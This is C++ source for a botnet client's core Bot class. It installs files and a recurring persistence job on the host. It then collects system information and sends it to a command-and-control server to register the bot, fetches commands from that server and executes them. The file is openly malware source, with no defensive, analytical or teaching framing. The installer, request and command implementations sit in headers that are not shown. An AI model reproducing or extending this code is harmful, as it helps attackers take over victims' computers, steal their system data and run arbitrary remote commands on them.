#include <iostream>
#include <memory>
#include <string>

#include "command.hh"
#include "installer.hh"
#include "request.hh"
#include "sysinfo.hh"
#include "util.hh"

class Bot {
   public:
    Bot(const std::string& install_dir);
    bool IsNew();
    void Install();
    void RegisterBot(const std::string& register_url);
    void ExecuteCommand(const std::string& command_url);

   private:
    bool is_new_;
    std::unique_ptr<Installer> install_;
    std::unique_ptr<sysinfo::DataList> sysinfo_;
};

// Initialize auth file and object to collect system info
Bot::Bot(const std::string& install_dir) {
    install_ = std::make_unique<Installer>(install_dir);
    std::string auth_hash = install_->GetAuthHash();
    sysinfo_ = std::make_unique<sysinfo::DataList>(auth_hash);
}

bool Bot::IsNew() { return install_->IsNew(); }

// Install files and components
void Bot::Install() {
    install_->InstallFiles();
    install_->InitRecurringJob();
}

// Register bot with C2 server
void Bot::RegisterBot(const std::string& register_url) {
    // Create POST form from sysinfo_ and send it to C2 server
    std::string data = sysinfo_->GetPostData();
    request::Post(register_url, data);
}

void Bot::ExecuteCommand(const std::string& command_url) {
    // Create POST form from sysinfo_ and send it to C2 server
    std::string data = sysinfo_->GetPostData();
    std::string response = request::Post(command_url, data);

    // Parse JSON response from C2 server and execute command
    Command cmd(response);
    cmd.Execute();
}